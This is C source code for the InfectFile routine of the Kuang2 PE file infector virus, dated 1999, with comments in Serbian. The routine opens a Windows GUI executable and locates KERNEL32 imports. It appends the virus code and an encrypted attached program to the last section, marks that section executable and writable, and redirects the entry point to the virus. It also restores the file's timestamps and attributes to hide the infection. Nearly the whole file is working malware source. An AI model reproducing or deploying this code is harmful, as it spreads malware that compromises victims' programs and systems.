/***[ThuNderSoft]*************************************************************
							   KUANG2: InfectFile
								   ver: 0.19
								˙˘ƒÕ WEIRD Õƒ˘˙
*****************************************************************************/

/* HISTORY */
// ver 0.19 (26-may-1999): test mod
// ver 0.18 (19-may-1999): overlay, bss sekcije
// ver 0.16 (18-may-1999): bug kod ITrva2ofs, viÑe istih DLLova
// ver 0.14 (15-may-1999): HNA i IAT
// ver 0.10 (14-may-1999): born code

#include <windows.h>
#include <ctypew.h>
#include <win95e.h>

// kada je definisan I_TESTMODE onda beleÇi sve informacije
// prilikom inficiranja fajla
//#define I_TESTMODE

// kada je definisan I_TESTMODE_API onda zapiÑi i sve import funkcije!
//#define I_TESTMODE_API




#ifdef I_TESTMODE
HANDLE testIfile;
DWORD Iwritten;
char _testb[16];
#endif

// potpis ms-dos exe fajla
#define		IMAGE_DOS_SIGNATURE1	0x5A4D		// MZ
#define		IMAGE_DOS_SIGNATURE2	0x4D5A		// ZM

// orijentaciona veÜa vrednost veliÅine virusa (za potrebe mapiranja fajla)
#define		VIRUSLEN	12500

// ime .exe fajla koji se dodaje na host PE exe
// (to je, u stvari, ime samog Kuang2.exe iz komandne linije)
extern char* addfile;

// externe promenljive iz samog virusa
extern char virus_start, virus_end;
extern unsigned int addfile_size;
extern unsigned int oldEntryPoint, oldEntryPointRVA, oldEPoffs, oldfilesize;
extern unsigned int oldoffs1, olddata1, oldoffs2, olddata2, oldoffs3, olddata3, oldoffs4, olddata4, oldoffs5, olddata5;
extern unsigned int ddGetModuleHandleA, ddGetProcAddress;
extern char kript;



/*
	InfectFile
	----------
  ˛ Inficira neki PE EXE fajl, koji je dat kao argument.
  ˛ Ne proverava se extenzija, ni da li je fajl veÜ zaraÇen.
  ˛ öuvaju se atributi i vreme upisa.
  ˛ VraÜa 0 ako je sve u redu. */

int InfectFile(char *fname)
{
	HANDLE hfile, hfilemap, haddfile;
	unsigned int fsize;				// veliÅina fajla
	char *filemap;					// pointer na MMF
	char *filestart;				// uvek pointer na poÅetak MMF
	unsigned int retvalue;			// povratna vrednost iz ove f-je
	unsigned int fattr;				// atributi fajla
	unsigned int NumberOfSections;	// broj sekcija PE fajla
	unsigned int *EntryPointRVA;	// pointer na mesto u fajlu gde se Åuva EntryPoint RVA
	unsigned int ImageBase;			// Image base adresa
	unsigned int SectionAlign;		// alignment veliÅine svake sekcije
	unsigned int *SizeofImage;		// pointer na SizeOfImage
	PIMAGE_DATA_DIRECTORY entry_idd;// pointer na prvi Data directorys
	char *ImportTable;				// Import Table
	unsigned int ISrva2ofs;			// konverzija RVA u file ofset (za ImportSekciju)
	unsigned int *IAT, *HNA;		// Import Address Table & Hint Name Address
	unsigned int *UseT;				// ili IAT ili HNA
	char *module_name;				// ime IMPORT modula
	char *virusstart;				// file offset gde Üe poÅeti virus
	char kernel32[]="KERNEL32.DLL"; // kernel32.dll
	char getmodulehandle[]="GetModuleHandleA";  // imena f-ja
	char getprocaddress[]="GetProcAddress";     // koje traÇimo
	unsigned int GetModuleHandleRVA;			// RVA adresa gde Üe virus...
	unsigned int GetProcAddressRVA;				// ...naÜi ove funkcije
	unsigned int i;								// pomoÜne promenljive
	unsigned int raw_virussize;					// veliÅina samo virus koda (bez add exe)
	unsigned int align_virussize;				// align veliÅina virus
	unsigned int overlay;						// veliÅina overlaya ako je ima
	FILETIME creation_time, lastacc_time, lastwr_time;
#define		function_name		module_name

#ifdef I_TESTMODE
	testIfile=CreateFile("c:\\k2test_i.dat", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL);
	WriteFile(testIfile, fname, lstrlen(fname), &Iwritten, NULL);
#endif





/*** POöETAK & PRIPREMA FAJLOVA ***/

	// uzmi atribute fajla i ako je setovan read-only onda ga resetuj
	fattr=GetFileAttributes(fname);			// uzmi atribute fajla
	if (fattr & FILE_ATTRIBUTE_READONLY)	// resetuj readonly ako ga ima
		SetFileAttributes(fname, fattr ^ FILE_ATTRIBUTE_READONLY);

	// otvari fajl
	hfile=CreateFile(fname, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, fattr, NULL);
	if (hfile==INVALID_HANDLE_VALUE) {retvalue=0x10; goto end1;}

#ifdef I_TESTMODE
	WriteFile(testIfile, "\r\nopen", 6, &Iwritten, NULL);
#endif

	// uzmi veliÅinu fajla
	fsize=GetFileSize(hfile, NULL);
	if (fsize>0xFFFFFFFF-VIRUSLEN) {retvalue=0x11; goto end2;}	// ako je fajl prevelik
	if (fsize<256) {retvalue=0x11; goto end2;}					// ako je fajl suviÑe mali
	oldfilesize=fsize;						// zapamti i originalnu veliÅinu fajla

	// saÅuvaj original vreme fajla
	GetFileTime(hfile, &creation_time, &lastacc_time, &lastwr_time);

	// kreiraj MMF
	hfilemap=CreateFileMapping (hfile, NULL, PAGE_READWRITE, 0, fsize+VIRUSLEN, NULL);
	if (hfilemap==NULL) {retvalue=0x12; goto end2;}
	// kreiraj MMF view na ceo fajl
	filemap=(void *) MapViewOfFile (hfilemap, FILE_MAP_ALL_ACCESS, 0,0,0);
	if (filemap==NULL) {retvalue=0x13; goto end3;}
	filestart=filemap;

#ifdef I_TESTMODE
	WriteFile(testIfile, "\r\nmapped", 8, &Iwritten, NULL);
#endif

	// proveri da li je fajl DOS .EXE
	if (*(unsigned short int *)filemap != IMAGE_DOS_SIGNATURE1)			// e_magic == MZ ?
		if (*(unsigned short int *)filemap != IMAGE_DOS_SIGNATURE2)		// e_magic == ZM ?
			{retvalue=0x101; goto end4;}								// nije, izaîi

	// pomeri se na adresu PE exe header-a
	filemap += ((PIMAGE_DOS_HEADER)filemap)->e_lfanew;

	// proveri da signature odgovara PE exe fajlu
	if (IsBadCodePtr((FARPROC)filemap)) {retvalue=0x102; goto end4;}
	if (*(DWORD *)filemap != IMAGE_NT_SIGNATURE)	// 'PE00'
		{retvalue=0x102; goto end4;}

	// preskoÅi signature i sada smo na poÅetku PE headera
	filemap += sizeof(DWORD);

#ifdef I_TESTMODE
	WriteFile(testIfile, "\r\nPEok", 6, &Iwritten, NULL);
#endif





/*** PREUZIMANJE PODATAKA ***/

	// preuzmi broj sekcija
	NumberOfSections = ((PIMAGE_FILE_HEADER)filemap)->NumberOfSections;

	// preskoÅi PE header i sada pokazujemo na PE Optional header
	filemap += IMAGE_SIZEOF_FILE_HEADER;

	// proveri da li je exe fajl za GUI (nije konzolna aplikacija)
	if (((PIMAGE_OPTIONAL_HEADER)filemap)->Subsystem != IMAGE_SUBSYSTEM_WINDOWS_GUI)
		{retvalue=0x103; goto end4;}

	// zapamti pointer na entry pointa
	i=(unsigned int)filemap + 16;		// 16 je ofset do EntryPoint-a
	EntryPointRVA = (unsigned int *)i;
	// zapamti ImageBase
	ImageBase = ((PIMAGE_OPTIONAL_HEADER)filemap)->ImageBase;
	// zapamti Alignment sekcija
	SectionAlign = ((PIMAGE_OPTIONAL_HEADER)filemap)->FileAlignment;
	// preuzmi pointer na SizeOfImage
	i=(unsigned int)filemap + 56;				// 56 je ofset do SizeOfImage
	SizeofImage = (unsigned int *)i;
	// preuzmi pointer na DirectoryData
	i=(unsigned int)filemap + 96;				// 96 je ofset do DirectoryData
	entry_idd = (PIMAGE_DATA_DIRECTORY) i;

	// vidi da li postoji IMPORT sekcija - ako ne postoji onda veliÅina==0
	if (!(entry_idd[IMAGE_DIRECTORY_ENTRY_IMPORT]).Size)
		{retvalue=0x105; goto end4;}

	// preskoÅi i PE Optional header, sada smo na poÅetku Section Table
	// ova tabla sadrÇi Section Header-e kojih ima NumberOfSections
	filemap += sizeof(IMAGE_OPTIONAL_HEADER);

#ifdef I_TESTMODE
	WriteFile(testIfile, "\r\nimport ok", 10, &Iwritten, NULL);
#endif





/*** NALAêENJE IMPORT SEKCIJE ***/

	i=0; ImportTable=NULL;

	// pretraÇi celu Section Table da bi naÑli Import sekciju (sadrÇi IT)
	// takoîe treba locirati poslednji Section Header
	while (i<NumberOfSections) {

#ifdef I_TESTMODE
// ime sekcije
		wsprintf(_testb, "\r\n%.8s", ((PIMAGE_SECTION_HEADER)filemap)->Name);
		WriteFile(testIfile, _testb, 10, &Iwritten, NULL);
#endif


		// Da li je trenutna sekcija IMPORT sekcija?
		// proverava se da li je VirtualAddress iz DirectoryData[IMPORT]
		// unutar RVA granica trenutne sekcije: [VirtualAddress, VirtualAddress+SizeOfRawData).
		if (!ImportTable)	// ako IMPORT sekcija joÑ uvek nije naîena
		if ((entry_idd[IMAGE_DIRECTORY_ENTRY_IMPORT]).VirtualAddress - ((PIMAGE_SECTION_HEADER)filemap)->VirtualAddress < ((PIMAGE_SECTION_HEADER)filemap)->SizeOfRawData) {
			// pomoÜna promenljiva, treba kasnije
			ISrva2ofs = (unsigned int) filestart + ((PIMAGE_SECTION_HEADER)filemap)->PointerToRawData - ((PIMAGE_SECTION_HEADER)filemap)->VirtualAddress;
			// Naîena je IMPORT sekcij!, preuzi file offset na njen poÅetak
			ImportTable = (char *) ((entry_idd[IMAGE_DIRECTORY_ENTRY_IMPORT]).VirtualAddress + ISrva2ofs);
			// iako je import sekcija pronaîena, vrti dalje da bi naÑao
			// poslednju sekciju
		}

		// idi na sledeÜu sekciju
		filemap+=IMAGE_SIZEOF_SECTION_HEADER;		// sizeof(IMAGE_SECTION_HEADER);
		i++;
	}

	// greÑka - nijedna sekcija nije IMPORT
	if (!ImportTable) {retvalue=0x106; goto end4;}






/*** NALAêENJE SVIH KERNEL32.DLL ***/

	// resetuje pointere
	GetModuleHandleRVA=GetProcAddressRVA=0;

	while (1) {

		// preuzmi ime DLLa
		i=((PIMAGE_IMPORT_DESCRIPTOR)ImportTable)->Name;
		if (i) module_name = (char *) (ISrva2ofs + i);
			else break;			// kraj, nema viÑe DLLova

		// poredi ime DLLa sa 'KERNEL32.DLL'
		if (!lstrcmpi(module_name, kernel32)) {


			/*** NAéAO KERNEL32.DLL - NALAêENJE WinAPI FUNKCIJA ***/

			// preuzmi file ofset na IAT
			i=ISrva2ofs + (unsigned int)((PIMAGE_IMPORT_DESCRIPTOR)ImportTable)->FirstThunk;
			IAT=(unsigned int*) (i);
			// preuzmi file ofset na HNA, ako je ima
			i=((PIMAGE_IMPORT_DESCRIPTOR)ImportTable)->Characteristics;
			if (i) {
				i+=ISrva2ofs;
				HNA=(unsigned int*) (i);
			} else HNA=0;

			UseT=IAT;				// pretraÇuje se IAT
			if (HNA)				// ako postoji HNA (nije Borland)
				if (*HNA != *IAT)	// ako razliÅito pokazuju IAT i HNA
					UseT=HNA;		// onda je IAT optimizovan (Micro$oft), pa se pretraÇuje HNA

			// pretraÇi IAT ili HNA za potrebnim funkcijama
			while (*UseT) {
				// postoji samo ordinal, idi dalje
				if ((signed int)(*UseT) < 0) {
					UseT++; IAT++;
					continue;
				}
				// postoji i ime funkcije, ordinal nije obavezan da postoji!
				i = *UseT + ISrva2ofs;
				function_name = ((PIMAGE_IMPORT_BY_NAME)i)->Name;

#ifdef I_TESTMODE_API
				WriteFile(testIfile, "\r\n", 2, &Iwritten, NULL);
				WriteFile(testIfile, function_name, lstrlen(function_name), &Iwritten, NULL);
#endif

				// poredi ime IMPORT f-je sa 'GetModuleHandleA', ako nije naîena
				if (!GetModuleHandleRVA)
				if (!lstrcmpi(function_name, getmodulehandle)) {
					// naÑao, saÅuvaj RVA na IAT [GetModuleHandleA]
					GetModuleHandleRVA = (unsigned int) IAT - ISrva2ofs;
					if (GetProcAddressRVA) break;	// ako su naîene obe f-je, izaîi
				}

				// poredi ime IMPORT f-je sa 'GetProcAddress', ako nije naîena
				if (!GetProcAddress)
				if (!lstrcmpi(function_name, getprocaddress)) {
					// naÑao, saÅuvaj RVA na IAT [GetProcAddress]
					GetProcAddressRVA = (unsigned int) IAT - ISrva2ofs;
					if (GetModuleHandleRVA) break;	// ako su naîene obe f-je, izaîi
				}

				// idi na sledeÜu IMPORT funkciju
				UseT++; IAT ++;
			}	// while, zavrÑena pretraga IAT

			// ako su naîene obe funkcije izaîi!
			if (GetModuleHandleRVA && GetProcAddressRVA) break;
		}

		// idi na sledeÜu IMPORT biblioteku
		ImportTable += sizeof (IMAGE_IMPORT_DESCRIPTOR);
	};

	if (!GetModuleHandleRVA)			// nije naÑao prvu f-ju
		{retvalue=0x108; goto end4;}
//	if (!GetProcAddressRVA)				// nije naÑao drugu f-ju
//		{retvalue=0x109; goto end4;}	// ali, ko zna, moÇda je izvuÅemo iz KERNEL32.DLL

#ifdef I_TESTMODE
	WriteFile(testIfile, "\r\nattach", 8, &Iwritten, NULL);
#endif






/*** ATTACH FILE ***/

#define		viruscode	module_name
#define		temp		ISrva2ofs
#define		j			NumberOfSections

	// otvori addexe fajl koji Üe se upisati
	haddfile=CreateFile(addfile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, fattr, NULL);
	if (haddfile==INVALID_HANDLE_VALUE) {retvalue=0x10A; goto end4;}
	// uzmi njegovu veliÅinu i ujedno je zapamti
	addfile_size=GetFileSize(haddfile, NULL);

	// vrati da filemap pokazuje na poslednju sekciju
	// paÇnja! postoje sekcije koje nisu fiziÅki prisutne u pe exe fajlu (.bss)
	// one se razlikuju samo po tome Ñto je njihov PointerToRawData==0
	// ili je SizeOfRawData==0
	do {
		filemap -= IMAGE_SIZEOF_SECTION_HEADER;
		temp=((PIMAGE_SECTION_HEADER)filemap)->SizeOfRawData;
		i=((PIMAGE_SECTION_HEADER)filemap)->PointerToRawData;
	} while ( !temp || !i );

	// naîi file ofset gde treba dodati virus. Na Çalost, VirtualSize moÇe
	// biti 0 (watcom linker) tako da se on ne moÇe koristiti.
	i+=temp;
	if (fsize>i) overlay=fsize-i; else overlay=0;
	virusstart = filestart + i + overlay;			// ako ima overlay, onda ga preskoÅi

	// odredi RAW veliÅinu koda virusa
	raw_virussize=&virus_end-&virus_start;
	// odredi i Align veliÅinu koda virusa + add file
	align_virussize=(((raw_virussize+addfile_size+overlay)/SectionAlign) + 1) * SectionAlign;
	// preuzmi pointer na poÅetak koda virusa
	viruscode=&virus_start;

	// zapiÑi u virus RVA+ImageBase naÑe dve winAPI f-je
	ddGetModuleHandleA = GetModuleHandleRVA + ImageBase;
	ddGetProcAddress = GetProcAddressRVA;
	if (GetProcAddressRVA) ddGetProcAddress += ImageBase;

	// Promeni RVA entry pointa na RVA poÅetka virusa
	oldEntryPoint=*EntryPointRVA + ImageBase;		// saÅuvaj u fajlu stari entry point (RVA + ImageBase)
	oldEntryPointRVA=*EntryPointRVA;				// saÅuvaj u fajlu samo RVA starog entry pointa
	j=((PIMAGE_SECTION_HEADER)filemap)->VirtualAddress + temp + overlay;
	oldEPoffs=(unsigned int) EntryPointRVA - (unsigned int) filestart;	// saÅuvaj i pointer na mesto entry pointa
	*EntryPointRVA=j;								// setuj RVA novog Entry Pointa

	// Promeni veliÅinu poslednje sekcije i celog fajla
	oldoffs1=filemap-filestart+16;								// zapamti fajl ofset i
	olddata1=((PIMAGE_SECTION_HEADER)filemap)->SizeOfRawData;	// stare podatke na tom mestu
	((PIMAGE_SECTION_HEADER)filemap)->SizeOfRawData += align_virussize;
	fsize += align_virussize - overlay;

	// Promeni veliÅinu poslednje sekcije (VirtualSize) ako <> 0
	oldoffs4=filemap-filestart+8;									// zapamti fajl offset i
	olddata4=((PIMAGE_SECTION_HEADER)filemap)->Misc.VirtualSize;	// stare podatke na tom mestu
	if (olddata4)													// setuj novu veliÅinu ako je ona <> 0
		((PIMAGE_SECTION_HEADER)filemap)->Misc.VirtualSize = ((PIMAGE_SECTION_HEADER)filemap)->SizeOfRawData;

	// Promeni veliÅinu sekcije (opet), ako ona postoji u DirectoryData.
	// prvo se mora ustanoviti koja je sekcija u pitanju: koje sekcije RVA
	// spada ovde (kao malo pre)
	oldoffs2=i=0;
	while (i<IMAGE_NUMBEROF_DIRECTORY_ENTRIES) {
		if ((entry_idd[i]).VirtualAddress - ((PIMAGE_SECTION_HEADER)filemap)->VirtualAddress < temp) {
			// naÑao sekciju, zapamti stare vrednosti
			oldoffs2=(unsigned int) &(entry_idd[i].Size) - (unsigned int) filestart;
			olddata2=(entry_idd[i]).Size;
			// promeni i njoj veliÅinu
			(entry_idd[i]).Size += align_virussize;
			break;
		}
		i++;
	}

	// Promeni karakteristiku ove poslednje sekcije (by Jacky Qwerty/29A)
	oldoffs3=filemap-filestart+36;								// zapamti fajl ofset i
	olddata3=((PIMAGE_SECTION_HEADER)filemap)->Characteristics; // stare podatke na tom mestu
	((PIMAGE_SECTION_HEADER)filemap)->Characteristics = (IMAGE_SCN_MEM_EXECUTE + IMAGE_SCN_MEM_READ + IMAGE_SCN_MEM_WRITE);

	// Promeni SizeOfImage za align_virussize
	oldoffs5=(unsigned int)SizeofImage-(unsigned int)filestart;
	olddata5=*SizeofImage;
	*SizeofImage+=align_virussize;

	kript=(char) GetTickCount();	// zapamti i sluÅajan broj koji sluÇi za dekriptovanje

#ifdef I_TESTMODE
	WriteFile(testIfile, "\r\nwrite", 7, &Iwritten, NULL);
#endif





/*** UPISIVANJE U FAJL ***/

	// UpiÑi virus u fajl
	for (j=0; j<raw_virussize; j++) virusstart[j]=viruscode[j];
	// UpiÑi i exe odmah posle
	virusstart=&virusstart[raw_virussize];
	ReadFile(haddfile, virusstart, addfile_size, (LPDWORD) &i, NULL);
	// Kriptuj fajl jednostavno i uvek sluÅajno
	for (j=0; j<addfile_size; j++, kript+=173) virusstart[j]-=kript;
	// zatvori add exe fajl
	CloseHandle(haddfile);





/*** REGULARAN KRAJ ***/

	retvalue=0;
	FlushViewOfFile(filestart,0);	// upiÑi sve promene nazad u fajl
end4:
	UnmapViewOfFile(filestart);		// zatvari MMF view
end3:
	CloseHandle(hfilemap);			// zatvori MMF
	// bez obzira da li je fajl uspeÑno inficiran ili ne treba setovati
	// njegovu veliÅinu, jer ako je nastala greÑka veliÅina fajla Üe
	// se poveÜati, a virus neÜe biti dodat!
	// namesti regularnu veliÅinu fajla
	SetFilePointer(hfile, fsize, NULL, FILE_BEGIN);
	SetEndOfFile(hfile);
	// vrati staro vreme
	SetFileTime(hfile, &creation_time, &lastacc_time, &lastwr_time);
	// a i atribute (ako je bio read-only)
	if (fattr & FILE_ATTRIBUTE_READONLY) SetFileAttributes(fname, fattr);
end2:
	CloseHandle(hfile);			// zatvori fajl
end1:

#ifdef I_TESTMODE
	WriteFile(testIfile, "\r\nend", 5, &Iwritten, NULL);
	CloseHandle(testIfile);
#endif

	return retvalue;			// vrati rezultat
}

